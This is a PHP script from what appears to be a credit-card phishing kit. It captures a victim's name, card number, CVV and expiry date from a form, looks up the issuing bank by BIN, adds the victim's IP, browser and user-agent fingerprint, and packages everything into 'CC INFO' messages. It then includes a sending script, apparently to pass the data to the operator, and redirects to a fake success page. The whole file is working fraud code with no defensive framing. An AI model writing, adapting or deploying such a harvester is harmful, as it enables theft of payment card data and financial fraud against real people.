<?php
error_reporting(0);
session_start();

include("detect.php"); 
$useragent = $_SERVER['HTTP_USER_AGENT'];
$brow = getBrowser() ;
$sys = getOs();
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;

$InfoDATE   = date("d-m-Y h:i:sa");

$name = $_SESSION['name'] = $_POST['name'];
$cc_numero = $_SESSION['cc-num'] = $_POST['cc-num'];
$cc_cvv = $_SESSION['cc-cvv'] = $_POST['cc-cvv'];
$cc_exp = $_SESSION['cc-exp'] = $_POST['cc-exp'];




$bincheck = $_POST['cc-num'] ;
$bincheck = preg_replace('/\s/', '', $bincheck);


$bin = $_POST['cc-num'] ;
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);

$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);




$yagmai .= '

[👤 Nom] = '.$_SESSION['name'].'
[💳 N° Carte] = '.$_SESSION['cc-num'].'
[🔑 (CVV)] = '.$_SESSION['cc-cvv'].'
[🔄 Expiry Date ] = '.$_SESSION['cc-exp'].'
        [+]━━━━【💳 Bin】━━━[+]
[🏛 Card Bank] = '.$_SESSION['bank_name'].' 
[💳 Card type] = '.$_SESSION['bank_type'].' 
[💳 Card brand] = '.$_SESSION['bank_brand'].' 
       [+]━━━━【💻 System】━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$brow.' and '.$sys.'
[🔍 FINGERPRINT] = '.$useragent.'
';



$yagmail .= '
[+]━━━━━━━━━━━━━━【💳 CC INFO】━━━━━━━━━━━━━━[+]
[👤 Nom] = '.$_SESSION['name'].'
[💳 N° Carte] = '.$_SESSION['cc-num'].'
[🔑 (CVV)] = '.$_SESSION['cc-cvv'].'
[🔄 Expiry Date ] = '.$_SESSION['cc-exp'].'
            [+]━━━━【💳 Bin】━━━[+]
[🏛 Card Bank]          = '.$_SESSION['bank_name'].' 
[💳 Card type]          = '.$_SESSION['bank_type'].' 
[💳 Card brand]         = '.$_SESSION['bank_brand'].' 
[+]━━━━━━━━━━━━━━━━【💻 System INFO】━━━━━━━━━━━━━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$brow.' and '.$sys.'
[🔍 FINGERPRINT] = '.$useragent.'
';

include("SendApi.php"); 



header('Location: ../succes.php');




?>